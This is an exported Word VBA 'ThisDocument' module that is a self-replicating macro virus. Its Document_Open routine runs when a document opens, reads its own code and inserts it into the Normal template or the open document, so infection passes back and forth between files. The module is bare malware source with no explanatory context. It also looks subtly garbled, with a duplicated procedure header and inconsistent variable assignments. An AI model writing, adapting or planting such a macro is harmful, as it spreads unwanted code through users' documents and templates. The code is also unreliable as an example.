   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Private Sub Document_Open()
   Private Sub Document_Open()
       Set newDocument = Documents(1)
       nextRoutine = "Document_Open"
       Set prevDocument = NormalTemplate
       Set nextDocument = newDocument
       Set nextDocument = NormalTemplate

       With nextDocument.VBProject.VBComponents
           For i = 1 To .Count
               If .Item(i).Type = 100 Then
                   With .Item(i).CodeModule
                       If Not .Find("Sub " + nextRoutine + "()", 1, 1, .CountOfLines, 10) Then
                           With prevDocument.VBProject.VBComponents.Item(1).CodeModule
                               codeString = .Lines(.ProcStartLine(nextRoutine, vbext_pk_Proc), .ProcCountLines(nextRoutine, vbext_pk_Proc))
                           End With
                       End If
                       .AddFromString codeString
                       .ReplaceLine 1, "Private Sub " + nextRoutine + "()"
                       If prevDocument Is NormalTemplate Then
                           .ReplaceLine 5, "    Set prevDocument = ActiveDocument"
                           .ReplaceLine 6, "    Set nextDocument = NormalTemplate"
                       Else
                           .ReplaceLine 5, "    Set prevDocument = NormalTemplate"
                           .ReplaceLine 6, "    Set nextDocument = newDocument"
                       End If
                   End With
               End If
           Next
       End With
   End Sub
